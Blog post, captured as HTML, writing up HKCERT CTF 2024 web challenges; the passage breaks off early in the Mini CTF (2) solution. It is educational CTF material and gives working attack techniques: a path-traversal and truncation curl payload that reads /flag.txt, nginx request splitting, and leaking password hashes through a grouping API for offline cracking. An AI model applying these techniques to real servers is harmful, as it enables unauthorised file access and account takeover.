@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr" data-bs-theme="dark">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HKCERT CTF 2024 Quals Writeup (III): The Web Challenges | Mystify</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300..700&family=Libre+Baskerville:ital,wght@0,400..700;1,400..700&family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/css/bootstrap.min.css"
+  integrity="sha512-2bBQCjcnw658Lho4nlXJcc6WkV/UxpE/sAokbXPxQNGqmNdQrWqtw26Ns9kFF/yG792pKR1Sx8/Y1Lf1XN4GKA==" crossorigin="anonymous"
+  referrerpolicy="no-referrer" />
+<link rel="stylesheet" href="/css/main.min.27b43d01a5c4432e35e87df4c1026d71d0e56b69b492a4e65a5564c213f27fa9.css" integrity="sha256-J7Q9AaXEQy416H30wQJtcdDla2m0kqTmWlVkwhPyf6k=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/prism.min.ebb6c0bd3fe6ed4e16ec09f3b52903ee18ddfb21e33b6882030d951a91b213e4.css" integrity="sha256-67bAvT/m7U4W7AnztSkD7hjd&#43;yHjO2iCAw2VGpGyE&#43;Q=" crossorigin="anonymous">
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.8/js/bootstrap.min.js"
+  integrity="sha512-nKXmKvJyiGQy343jatQlzDprflyB5c+tKCzGP3Uq67v+lmzfnZUi/ZT+fc6ITZfSC5HhaBKUIvr/nTLCV+7F+Q==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
+  integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous"
+  referrerpolicy="no-referrer"></script>
+        <script src="/js/main.f2979a93a325fecf9605263bd141398a311c8e23388ed7dcff74f92f7e632866.js" integrity="sha256-8peak6Ml/s&#43;WBSY70UE5ijEcjiM4jtfc/3T5L35jKGY=" crossorigin="anonymous"></script>
+        <script src="/js/prism.0ecb34b0181efd0f9aa6d1a8fc2e4814ffbdd9acc78d93d02a94e01f64f87f35.js" integrity="sha256-Dss0sBge/Q&#43;aptGo/C5IFP&#43;92azHjZPQKpTgH2T4fzU=" crossorigin="anonymous"></script>
+
+
+
+</head>
+<body class="overflow-y-scroll">
+  <nav class="navbar navbar-expand-lg sticky-top bg-body-tertiary">
+  <div class="container">
+    <a class="navbar-brand" href="/">Mystify</a>
+
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+      <span class="navbar-toggler-icon"></span>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+      <div class="navbar-nav">
+        
+        
+          <a class="nav-link " href="/about-me/">
+            About Me 
+          </a>
+        
+          <a class="nav-link " href="/blogroll/">
+            Blogroll 
+          </a>
+        
+          <a class="nav-link " href="/crypto-in-ctf/">
+            Crypto in CTF 
+          </a>
+        
+      </div>
+    </div>
+  </div>
+</nav>
+
+  <main>
+    <div class="container mt-3">
+      
+  <div class="row justify-content-center">
+    <div class="col-8">
+      <h1 class="post-title">HKCERT CTF 2024 Quals Writeup (III): The Web Challenges</h1>
+
+      
+      <div class="text-muted pb-4">
+        
+          
+          
+          <time datetime="2025-06-29T15:30:02&#43;08:00">2025-06-29</time>
+        
+        
+        <span class="px-1">::</span>
+        
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/ctf/" class="text-muted text-decoration-none">#ctf</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/hkcert-ctf/" class="text-muted text-decoration-none">#hkcert-ctf</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/challenge-writing/" class="text-muted text-decoration-none">#challenge-writing</a>
+          </span>
+        
+          <span class="badge rounded-pill bg-secondary">
+            <a href="https://mystiz.hk/tags/web/" class="text-muted text-decoration-none">#web</a>
+          </span>
+        
+      </div>
+      
+
+      <div class="post-content js-toc-content"><div>
+          <p>Surprisingly, I also wrote three series of web challenges this year: <em>Custom Web Server</em>, <em>Mystiz's Mini CTF</em> and <em>⚡</em>. They are all inspired from the real-life -- either from security reviews or the bugs I came across while developing web apps.</p>
+<h2 id="custom-web-server-1">Custom Web Server (1)<a href="#custom-web-server-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary">Challenge Summary<a href="#challenge-summary" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p>Someone said: 'One advantage of having a homemade server is that it becomes much harder to hack.' Do you agree? Give reasons.</p>
+<p>Note: The files in <code>src/public</code> are unrelated for the challenge.</p>
+<p>Attachment: <a href="https://github.com/blackb6a/hkcert-ctf-2024-challenges-public/releases/download/v1.0.0/custom-server-1_6d8967a25def900543b2f8f012b7e673.zip"
+   
+   target="_blank" rel="noopener noreferrer" >custom-server-1_6d8967a25def900543b2f8f012b7e673.zip</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg></p>
+</blockquote>
+<p>This challenge implements a minimalistic web server written in C that serves static pages. The goal is to read the flag, which is located in <code>/flag.txt</code>.</p>
+
+
+<figure>
+  <img src="/images/2025-06-29-hkcert-ctf/cws.png" title="">
+  
+</figure>
+
+<div class="alert info">
+  &#x1f60f; <strong>Déjà vu?</strong> If you think that's familiar, that is definitely a coincidence.
+</div>
+
+<h3 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The HTTP requests will be handled in the <code>handle_client</code> method. When <code>GET /...</code> is received, it will proceed and run <code>read_file</code> below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">FileWithSize</span> <span class="o">*</span><span class="nf">read_file</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">ends_with</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#34;.html&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">ends_with</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#34;.png&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">ends_with</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#34;.css&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">ends_with</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#34;.js&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">real_path</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">snprintf</span><span class="p">(</span><span class="n">real_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">real_path</span><span class="p">),</span> <span class="s">&#34;public/%s&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fd</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">real_path</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fd</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// snipped...
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>There are two vulnerabilities in the above function.</p>
+<div class="alert danger">
+  <p><strong>🐛 Vulnerability 1.</strong> Directory traversal to the parent directories</p>
+<p>We can set the file name to be <code>../test.png</code> to read the files outside <code>public/</code>. With this, we are able to arbitrary files that have the extension <code>.png</code>, <code>.css</code> or <code>.js</code>.</p>
+
+</div>
+
+<div class="alert danger">
+  <p><strong>🐞 Vulnerability 2.</strong> Path truncation in <code>snprintf</code></p>
+<p><code>snprintf</code> will truncate the resulting string without errors if it is longer than expected. Assume now that <code>sizeof(real_path) == 20</code> and we set <code>filename</code> to be <code>testing1.txt.jpg</code>, the value of <code>real_path</code> after the line <code>snprintf(real_path, sizeof(real_path), &quot;public/%s&quot;, filename)</code> would be <code>public/testing1.txt</code>, and the trailing <code>.jpg</code> was truncated.</p>
+
+</div>
+
+<p>The first vulnerability allows us to read files from the parent directories, and the second allows us to bypass the extension whitelist (<code>.html</code>, <code>.css</code>, and so on).</p>
+<p>With a similar idea, we can set the filename to be</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">//[✂️ snipped]//../../flag.txt.js
+</span></span><span class="line"><span class="cl">&lt;-- 1002 /&#39;s --&gt;
+</span></span></code></pre></div><p>In this case, it will try to access <code>public/../../flag.txt</code>, effectively <code>/flag.txt</code>. We can use the below command (note the <code>--path-as-is</code> flag):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl --path-as-is http://HOSTNAME///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////../../flag.txt.js
+</span></span><span class="line"><span class="cl"><span class="c1"># hkcert24{bu1ld1n9_4_w3bs3rv3r_t0_s3rv3_5t4t1c_w3bp4935_1s_n0ntr1vial}</span>
+</span></span></code></pre></div><h2 id="custom-web-server-2">Custom Web Server (2)<a href="#custom-web-server-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-1">Challenge Summary<a href="#challenge-summary-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p>Someone said: 'One advantage of having a homemade server is that it becomes much harder to hack.' Do you agree? Give reasons.</p>
+<p>What is the difference between this and the first part? I will also use nginx to proxy your requests this time!</p>
+<p>Note: The files in <code>src/public</code> are still unrelated for the challenge.</p>
+<p>Attachment: <a href="https://github.com/blackb6a/hkcert-ctf-2024-challenges-public/releases/download/v1.0.0/custom-server-2_ceb1b67883e9927a349ecc1cafa138a5.zip"
+   
+   target="_blank" rel="noopener noreferrer" >custom-server-2_ceb1b67883e9927a349ecc1cafa138a5.zip</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg></p>
+</blockquote>
+<p>The challenge is similar to the first part, except that the web server is hosted behind a nginx instance.</p>
+<pre tabindex="0"><code class="language-conf" data-lang="conf">user www-data;
+
+thread_pool default threads=1 max_queue=65536;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    upstream backend {
+        server web:8000;
+        keepalive 32;
+    }
+
+    server {
+        listen 80;
+        server_name proxy;
+
+        location / {
+            proxy_pass http://backend;
+            proxy_set_header Host $host;
+        }
+    }
+}
+</code></pre><h3 id="solution-1">Solution<a href="#solution-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h4 id="no-the-solution-doesnt-work-anymore">No, the solution doesn't work anymore<a href="#no-the-solution-doesnt-work-anymore" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Now we are talking to the web server via nginx, which will relay our requests with some changes. The most important change is that nginx will normalize the request path. For instance, the payload we used in <em>Custom Web Server (1)</em> will be simplified to <code>/flag.txt.js</code>. The normalization imposes two problems:</p>
+<ol>
+<li><strong><code>../</code> is removed to mitigate the directory traversal attack.</strong> We cannot read files outside the <code>public</code> folder.</li>
+<li><strong>Consecutive slashes, for instance <code>//////</code>, are normalized into a single slash.</strong> We cannot read <code>flag.txt</code> even if it is located in the public directory.</li>
+</ol>
+<h4 id="squeezing-two-requests-into-one-request">&quot;Squeezing&quot; two requests into one request<a href="#squeezing-two-requests-into-one-request" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>This challenge is vulnerable, however, because nginx and the custom server (<code>mystiz-web</code>) handle the request differently. Assuming that we are sending a normalized request (i.e., nginx will change nothing):</p>
+<ul>
+<li>nginx is able to handle a request with arbitrary size according to the <code>Content-Length</code> header</li>
+<li><code>mystiz-web</code> can only read up to 1024 bytes per request</li>
+</ul>
+<p>In this case, we can send a request so that nginx thinks that it is a single request, and <code>mystiz-web</code> thinks that there are two.</p>
+<p>Below is an example of this to happen. nginx adds a new entry <code>Connection: close</code> to the header. Also, the last line is considered as the request body of the <em>only</em> request. It is then sent to <code>mystiz-web</code>. <code>mystiz-web</code> will split the requests into chunks of 1024 bytes, one to <code>/index.html</code> and one to <code>/../../flag.txt</code>.</p>
+
+
+<figure>
+  <img src="/images/2025-06-29-hkcert-ctf/cws-2-1-request.png" title="">
+  
+</figure>
+
+<p>Therefore, <code>mystiz-web</code> will be reading both <code>public/index.html</code> and <code>/flag.txt</code>. However, nginx will not be responding <code>/flag.txt</code> to us because they only see one request going on.</p>
+
+
+<figure>
+  <img src="/images/2025-06-29-hkcert-ctf/cws-2-1-response.png" title="">
+  
+</figure>
+
+<p>To make nginx respond to the second request, we have to convince that there are two requests. We can concatenate the existing request with a request to <code>/index.html</code>:</p>
+
+
+<figure>
+  <img src="/images/2025-06-29-hkcert-ctf/cws-2-2-request.png" title="">
+  
+</figure>
+
+<div class="alert danger">
+  🤨 <strong>Why don't we add the <code>Connection: close</code> ourselves?</strong> We want to maintain our connection with nginx. If the header is added, the connection will be closed when we send the second request. With that said, we would not get the second response.
+</div>
+
+<p>Now nginx sees two requests, so it will try to gather two responses:</p>
+
+
+<figure>
+  <img src="/images/2025-06-29-hkcert-ctf/cws-2-2-response.png" title="">
+  
+</figure>
+
+<div class="alert warning">
+  😡 <strong>I am not getting the flag sometimes!</strong> Although we are sending two requests to nginx in the same connection, nginx might be sending the two requests to different instances of <code>mystiz-web</code>. In this case, nginx would like to collect the first response from each of the instances, both being <code>public/index.html</code>.
+</div>
+
+<h2 id="mystizs-mini-ctf-1">Mystiz's Mini CTF (1)<a href="#mystizs-mini-ctf-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-2">Challenge Summary<a href="#challenge-summary-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p>&quot;A QA engineer walks into a bar. Orders a beer. Orders 0 beers. Orders 99999999999 beers. Orders a lizard. Orders -1 beers. Orders a ueicbksjdhd.&quot;</p>
+<p>I am working on yet another CTF platform. I haven't implement all the features yet, but I am confident that it is at least secure.</p>
+<p>Can you send me the flag of the challenge &quot;Hack this site!&quot;?</p>
+<p>Attachment: <a href="https://github.com/blackb6a/hkcert-ctf-2024-challenges-public/releases/download/v1.0.0/minictf-1_bc36d27733c38dceeec332324267b77d.zip"
+   
+   target="_blank" rel="noopener noreferrer" >minictf-1_bc36d27733c38dceeec332324267b77d.zip</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg></p>
+</blockquote>
+
+
+<figure>
+  <img src="/images/2025-06-29-hkcert-ctf/mini-ctf.png" title="">
+  
+</figure>
+
+<p>The players are asked to find a flag for a challenge that has only one solver, and the solver has a weak password (composed of 6 hexadecimal characters).</p>
+<h3 id="solution-2">Solution<a href="#solution-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>From the migration file (<code>web/migrations/versions /96fa27cc07b9_init.py</code>), we can see that the user <code>player</code> has solved the challenge &quot;Hack this site!&quot;. Notably, their password is generated by <code>os.urandom(3).hex()</code>, where there are only $2^{24} \approx 1.68 \times 10^7$ options. Maybe we can try to exhaust the password on the login endpoint?</p>
+<p>Turns out we cannot. The login endpoint has a rate limit being two requests per minute. It would be good if we could exhaust the (hashed) password and guess it offline.</p>
+<p>Interestingly, in <code>/api/__init__.py</code>, there is a <code>GroupAPI</code> class that implements a &quot;group&quot; feature in the list resource endpoints. We can activate that by adding the <code>group</code> parameter. For instance, the API <code>GET /challenges/?group=category</code> is used to group the challenges by category:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;challenges&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;web&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nt">&#34;category&#34;</span><span class="p">:</span> <span class="s2">&#34;web&#34;</span><span class="p">,</span> <span class="nt">&#34;title&#34;</span><span class="p">:</span> <span class="s2">&#34;...&#34;</span><span class="p">,</span> <span class="nt">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;...&#34;</span><span class="p">,</span> <span class="err">...</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;crypto&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="nt">&#34;category&#34;</span><span class="p">:</span> <span class="s2">&#34;crypto&#34;</span><span class="p">,</span> <span class="nt">&#34;title&#34;</span><span class="p">:</span> <span class="s2">&#34;...&#34;</span><span class="p">,</span> <span class="nt">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;...&#34;</span><span class="p">,</span> <span class="err">...</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;reverse&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span> <span class="nt">&#34;category&#34;</span><span class="p">:</span> <span class="s2">&#34;reverse&#34;</span><span class="p">,</span> <span class="nt">&#34;title&#34;</span><span class="p">:</span> <span class="s2">&#34;...&#34;</span><span class="p">,</span> <span class="nt">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;...&#34;</span><span class="p">,</span> <span class="err">...</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="err">...</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Although not used by the front-end, the <code>User</code> and <code>Attempt</code> models are also serving the APIs with <code>GroupAPI</code>. With that said, we are able to group users by their attributes. In particular, we can group users by their passwords. This is what <code>GET /users/?group=password</code> looks like:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;users&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;1ae605f9.86cf107e81233595ce4d0cdbcece20e177e7cd22bcd27d07fb3ba10a6ad6a712&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nt">&#34;is_admin&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nt">&#34;score&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;77364c85.744c75c952ef0b49cdf77383a030795ff27ad54f20af8c71e6e9d705e5abfb94&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span> <span class="nt">&#34;is_admin&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nt">&#34;score&#34;</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span> <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;player&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Now we have the hashed password. We can check the source code for <code>compute_hash</code> in <code>app/util.py</code> on how the hash is computed.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">compute_hash</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">salt</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">salt</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">salt</span> <span class="o">+</span> <span class="s1">&#39;.&#39;</span> <span class="o">+</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">salt</span><span class="si">}</span><span class="s1">/</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</span></span></code></pre></div><p>With that, we can write a script to exhaust passwords locally. After retrieving the user password, we can sign in as the user. Similarly, we can leak the <code>flag</code> via the <code>Attempt</code> model, and accessing <code>/attempts/?group=flag</code> would bring us the flag:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">hkcert24{y0u_c4n_9r0up_unsp3c1f13d_4t7r1bu73s_fr0m_th3_4tt3mp7_m0d3l}
+</span></span></code></pre></div><h2 id="mystizs-mini-ctf-2">Mystiz's Mini CTF (2)<a href="#mystizs-mini-ctf-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="challenge-summary-3">Challenge Summary<a href="#challenge-summary-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<blockquote>
+<p>&quot;A QA engineer walks into a bar. Orders a beer. Orders 0 beers. Orders 99999999999 beers. Orders a lizard. Orders -1 beers. Orders a ueicbksjdhd.&quot;</p>
+<p>I am working on yet another CTF platform. I haven't implement all the features yet, but I am confident that it is at least secure.</p>
+<p>Can you send me the flag of the challenge &quot;A placeholder challenge&quot;?</p>
+<p>Attachment: <a href="https://github.com/blackb6a/hkcert-ctf-2024-challenges-public/releases/download/v1.0.0/minictf-1_bc36d27733c38dceeec332324267b77d.zip"
+   
+   target="_blank" rel="noopener noreferrer" >minictf-1_bc36d27733c38dceeec332324267b77d.zip</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
+    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
+</svg></p>
+</blockquote>
+<p>This is a sequel to <em>Mystiz's Mini CTF (1)</em>, where the players are asked to find the flag for a challenge that will be available one year later. The challenge is only accessible by admins until it is released.</p>
+<h3 id="solution-3">Solution<a href="#solution-3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>The flag is directly in the description of the challenge. However, it will be released after a year, and a normal player will be unable to check that out until then. An admin could access them via the <code>GET /api/admin/challenges/</code> endpoint, though.</p>
